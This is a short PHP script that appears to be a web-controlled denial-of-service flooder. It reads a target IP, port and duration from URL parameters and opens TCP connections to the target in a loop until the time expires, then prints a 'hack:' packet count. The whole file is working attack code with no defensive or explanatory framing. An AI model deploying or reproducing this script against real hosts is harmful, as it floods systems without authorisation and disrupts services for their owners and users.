<?php
	ini_set("display_errors", "Off");
	set_time_limit(0);
	ignore_user_abort(FALSE);
	$packets = 0;
	$ip = $_GET['ip'];
	$port = $_GET['port'];
	$exec_time = $_GET['time'];
	$time = time();
	$max_time = $time+$exec_time;
	if(empty($_GET['ip'])){
		echo 'ipisnull';
		exit(1);
	}
	while(1){
		$packets++;
		if(time() > $max_time){
			break;
		}
		$fp = pfsockopen("tcp://$ip", $port,$errno,$errstr,0);
	}
	echo 'hack:'.$packets;
?>